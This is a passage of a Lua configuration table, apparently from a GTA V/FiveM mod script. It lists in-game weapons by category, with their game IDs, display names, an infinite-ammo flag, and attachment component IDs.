                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"}
                },
                Sights = {{name = "~s~~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL_02"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_03"}},
                BarrelAttachments = {
                    {name = "~s~~s~Compensator", id = "COMPONENT_AT_PI_COMP_02"},
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}
                }
            }
        },
        HeavyPistol = {
            id = "weapon_heavypistol",
            name = "~s~~s~Heavy Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        VintagePistol = {
            id = "weapon_vintagepistol",
            name = "~s~~s~Vintage Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_02"}
                },
                BarrelAttachments = {{"Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        FlareGun = {id = "weapon_flaregun", name = "~s~~s~Flare Gun", bInfAmmo = false, mods = {}},
        MarksmanPistol = {id = "weapon_marksmanpistol", name = "~s~~s~Marksman Pistol", bInfAmmo = false, mods = {}},
        HeavyRevolver = {id = "weapon_revolver", name = "~s~~s~Heavy Revolver", bInfAmmo = false, mods = {}},
        HeavyRevolverMkII = {
            id = "weapon_revolver_mk2",
            name = "~s~~s~Heavy Revolver Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_01"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Compensator", id = "COMPONENT_AT_PI_COMP_03"}}
            }
        },
        DoubleActionRevolver = {
            id = "weapon_doubleaction",
            name = "~s~~s~Double Action Revolver",
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {id = "weapon_raypistol", name = "~s~~s~Up-n-Atomizer", bInfAmmo = false, mods = {}}
    },
    SMG = {
        MicroSMG = {
            id = "weapon_microsmg",
            name = "~s~~s~Micro SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MICROSMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MICROSMG_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        SMG = {
            id = "weapon_smg",
            name = "~s~~s~SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SMG_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_SMG_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO_02"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        SMGMkII = {
            id = "weapon_smg_mk2",
            name = "~s~~s~SMG Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SMG_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SMG_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_SMG_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_SMG_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_SMG_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS_SMG"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},
                    {name = "~s~~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_SMG_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_SB_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_SB_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                }
            }
        },
        AssaultSMG = {
            id = "weapon_assaultsmg",
            name = "~s~~s~Assault SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        CombatPDW = {
            id = "weapon_combatpdw",
            name = "~s~~s~Combat PDW",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMBATPDW_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMBATPDW_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_COMBATPDW_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        MachinePistol = {
            id = "weapon_machinepistol",
            name = "~s~~s~Machine Pistol ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_03"}
                },
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        MiniSMG = {
            id = "weapon_minismg",
            name = "~s~~s~Mini SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MINISMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MINISMG_CLIP_02"}
                }
            }
        },
        UnholyHellbringer = {id = "weapon_raycarbine", name = "~s~~s~Unholy Hellbringer", bInfAmmo = false, mods = {}}
    },
    Shotguns = {
        PumpShotgun = {
            id = "weapon_pumpshotgun",
            name = "~s~~s~Pump Shotgun",
            bInfAmmo = false,
            mods = {
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_SR_SUPP"}}
            }
        },
        PumpShotgunMkII = {
            id = "weapon_pumpshotgun_mk2",
            name = "~s~~s~Pump Shotgun Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},
                    {name = "~s~~s~Dragon Breath Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Steel Buckshot Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~Flechette Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~Explosive Slugs", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "~s~~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"},
                    {name = "~s~~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"}
                }
            }
        },
        SawedOffShotgun = {id = "weapon_sawnoffshotgun", name = "~s~~s~Sawed-Off Shotgun", bInfAmmo = false, mods = {}},
        AssaultShotgun = {
            id = "weapon_assaultshotgun",
            name = "~s~~s~Assault Shotgun",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        BullpupShotgun = {
            id = "weapon_bullpupshotgun",
            name = "~s~~s~Bullpup Shotgun",
            bInfAmmo = false,
            mods = {
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        Musket = {id = "weapon_musket", name = "~s~~s~Musket", bInfAmmo = false, mods = {}},
        HeavyShotgun = {
            id = "weapon_heavyshotgun",
            name = "~s~~s~Heavy Shotgun",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        DoubleBarrelShotgun = {
            id = "weapon_dbshotgun",
            name = "~s~~s~Double Barrel Shotgun",
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {id = "weapon_autoshotgun", name = "~s~~s~Sweeper Shotgun", bInfAmmo = false, mods = {}}
    },
    AssaultRifles = {
        AssaultRifle = {
            id = "weapon_assaultrifle",
            name = "~s~~s~Assault Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        AssaultRifleMkII = {
            id = "weapon_assaultrifle_mk2",
            name = "~s~~s~Assault Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_AR_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_AR_BARREL_0"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        CarbineRifle = {
            id = "weapon_carbinerifle",
            name = "~s~~s~Carbine Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_02"},
                    {name = "~s~~s~Box Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CarbineRifleMkII = {
            id = "weapon_carbinerifle_mk2",
            name = "~s~~s~Carbine Rifle Mk II ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_CR_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_CR_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        AdvancedRifle = {
            id = "weapon_advancedrifle",
            name = "~s~~s~Advanced Rifle ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}}
            }
        },
        SpecialCarbine = {
            id = "weapon_specialcarbine",
            name = "~s~~s~Special Carbine",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        SpecialCarbineMkII = {
            id = "weapon_specialcarbine_mk2",
            name = "~s~~s~Special Carbine Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_SC_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_SC_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        BullpupRifle = {
            id = "weapon_bullpuprifle",
            name = "~s~~s~Bullpup Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        BullpupRifleMkII = {
            id = "weapon_bullpuprifle_mk2",
            name = "~s~~s~Bullpup Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Armor Piercing Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_MK2"},
                    {name = "~s~~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_BP_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_BP_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CompactRifle = {
            id = "weapon_compactrifle",
            name = "~s~~s~Compact Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_03"}
                }
            }
        }
    },
    LMG = {
        MG = {
            id = "weapon_mg",
            name = "~s~~s~MG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MG_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL_02"}}
            }
        },
        CombatMG = {
            id = "weapon_combatmg",
            name = "~s~~s~Combat MG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMBATMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMBATMG_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CombatMGMkII = {
            id = "weapon_combatmg_mk2",
            name = "~s~~s~Combat MG Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_MG_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_MG_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
